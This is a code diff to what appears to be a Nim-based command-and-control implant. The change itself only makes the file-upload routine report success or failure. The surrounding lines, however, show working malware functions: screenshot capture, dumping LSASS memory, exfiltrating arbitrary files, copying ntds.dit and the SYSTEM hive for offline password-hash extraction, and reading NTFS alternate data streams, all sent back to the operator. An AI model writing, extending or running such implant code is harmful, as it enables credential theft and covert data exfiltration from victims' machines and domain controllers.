@@ -2238,7 +2238,7 @@ proc screenwatchTick*(t: var AgentTransport) =
   elif data.len > 0:
     let nm = "watch_" & $gSwFrame & (when defined(windows): ".bmp" else: ".png")
     inc gSwFrame
-    t.uploadFile(gSwTaskId, nm, data)
+    discard t.uploadFile(gSwTaskId, nm, data)
     t.sendResult(gSwTaskId, "[+] screenwatch frame captured", "")
 
 when defined(windows):
@@ -2462,7 +2462,7 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
       t.sendResult(id, "", "screenshot failed")
     else:
       let ext = when defined(windows): ".bmp" else: ".png"
-      t.uploadFile(id, "screenshot" & ext, data)
+      discard t.uploadFile(id, "screenshot" & ext, data)
       t.sendResult(id, "[+] screenshot captured (" & $data.len & " bytes)", "")
 
   of "STAGE2":
@@ -2720,7 +2720,7 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
         if dmpBytes.len == 0:
           t.sendResult(id, "", "lsass_dump_nt: dump failed (need admin?)")
         else:
-          t.uploadFile(id, "lsass_nt.dmp", dmpBytes)
+          discard t.uploadFile(id, "lsass_nt.dmp", dmpBytes)
           t.sendResult(id, "[+] lsass NT dump: " & $dmpBytes.len & " bytes", "")
       except: t.sendResult(id, "", "lsass_dump_nt: " & getCurrentExceptionMsg())
     else:
@@ -2830,8 +2830,12 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
                        parseJson(args){"path"}.getStr()
                      else: args
       let data = cast[seq[byte]](readFile(filePath))
-      t.uploadFile(id, extractFilename(filePath), data)
-      t.sendResult(id, "uploaded " & $data.len & " bytes", "")
+      let uploaded = t.uploadFile(id, extractFilename(filePath), data)
+      when Transport != "dns":
+        if uploaded:
+          t.sendResult(id, "uploaded " & $data.len & " bytes", "")
+        else:
+          t.sendResult(id, "", "upload failed")
     except: t.sendResult(id, "", "read failed: " & getCurrentExceptionMsg())
 
   of "KERB_LIST":
@@ -2986,7 +2990,7 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
           for tup in [(ntdsPath, "ntds.dit"), (sysPath, "SYSTEM")]:
             try:
               let dat = readFile(tup[0])
-              t.uploadFile(id, tup[1], cast[seq[byte]](dat))
+              discard t.uploadFile(id, tup[1], cast[seq[byte]](dat))
             except: dcErr.add("read " & tup[0] & ": " & getCurrentExceptionMsg() & "; ")
           discard runShell("rmdir /S /Q \"" & tmpDir & "\" 2>&1")
           t.sendResult(id, "[+] DCSYNC: ntds.dit + SYSTEM uploaded. Run: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL", dcErr)
@@ -3028,7 +3032,7 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
           var buf = newSeq[byte](fsz); var rd: DWORD
           discard ReadFile(hF, addr buf[0], fsz, addr rd, nil)
           discard CloseHandle(hF); buf.setLen(rd)
-          t.uploadFile(id, stream, buf)
+          discard t.uploadFile(id, stream, buf)
           t.sendResult(id, "[+] ADS read " & $rd & " bytes", "")
         except: t.sendResult(id, "", "ads_read: " & getCurrentExceptionMsg())
       of "ADS_WRITE":
